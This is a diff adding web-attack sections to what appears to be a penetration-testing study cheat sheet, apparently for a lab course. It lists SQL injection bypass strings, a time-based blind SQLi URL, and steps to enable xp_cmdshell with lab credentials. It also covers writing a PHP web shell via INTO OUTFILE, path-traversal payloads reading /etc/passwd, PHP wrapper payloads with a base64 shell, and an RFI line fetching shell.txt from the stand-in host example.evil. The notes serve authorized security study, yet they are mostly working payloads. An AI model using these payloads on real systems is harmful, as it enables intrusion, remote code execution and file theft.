@@ -68,7 +68,103 @@ smbclient \\\x.x.x.x\\share
 ```bash
 snmpwalk -c public -v1 x.x.x.x
 ```
-   
+
+### SQL injection
+```bash
+admin' or '1'='1
+' or '1'='1
+" or "1"="1
+" or "1"="1"--
+" or "1"="1"/*
+" or "1"="1"#
+" or 1=1
+" or 1=1 --
+" or 1=1 -
+" or 1=1--
+" or 1=1/*
+" or 1=1#
+" or 1=1-
+") or "1"="1
+") or "1"="1"--
+") or "1"="1"/*
+") or "1"="1"#
+") or ("1"="1
+") or ("1"="1"--
+") or ("1"="1"/*
+") or ("1"="1"#
+) or '1`='1-
+```
+#### Blind SQL Injection - This can be identified by Time-based SQLI
+```bash
+#Application takes some time to reload, here it is 3 seconds
+http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
+```
+
+#### Manual Code Execution
+```bash
+kali> impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth #To login
+EXECUTE sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+#Now we can run commands
+EXECUTE xp_cmdshell 'whoami';
+
+#Sometimes we may not have direct access to convert it to RCE from web, then follow below steps
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- // #Writing into a new file
+#Now we can exploit it
+http://192.168.45.285/tmp/webshell.php?cmd=id #Command execution
+```
+
+#### SQLi resources
+- https://github.com/SofianeHamlaoui/Lockdoor-Framework/blob/master/ToolsResources/WEB/CHEATSHEETS/sqli.md
+- https://github.com/jhaddix/tbhm/blob/master/06_SQLi.md
+
+
+#### LFI - often chained with php exploits. upload php payload and use LFI to read the payload and execute
+- https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI
+- https://0xffsec.com/handbook/web-applications/file-inclusion-and-path-traversal/
+```bash
+#LFI check - Unix
+<base url>/../../../../../../etc/passwd
+<base url>/../../../../../../etc/passwd%00
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%2500
+
+
+#LFI check - Windows
+<base url>/../../../../../../../windows/system32/drivers/etc/hosts
+.././../../../../../../../../windows/system32/drivers/etc/hosts
+../../../../../../../../../../windows/system32/drivers/etc/hosts%00
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/system32/drivers/etc/hosts
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/system32/drivers/etc/hosts%2500
+
+#LFI exploit
+#(1) expect://
+http://x.x.x.x/blah?parameter=expect://whoami
+
+#(2) data://
+http://x.x.x.x/blah?parameter=data://text/plain;base64,PD8gcGhwaW5mbygpOyA/Pg==
+# the base64 encoded payload is: <? phpinfo(); ?>
+
+#(3) input://
+http://x.x.x.x/blah?parameter=php://input
+# POST data (using Hackbar)
+<? phpinfo(); ?>
+
+#Base64 conversion
+echo -n '<?php system($_GET['c']); ?>' | base64
+#output is PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=
+```
+
+#### RFI
+```bash
+http://example.com/index.php?page=http://example.evil/shell.txt
+
+#Null Byte #
+http://example.com/index.php?page=http://example.evil/shell.txt%00
+```
+
 # Active Directory Pentesting
 
 ## Enumeration
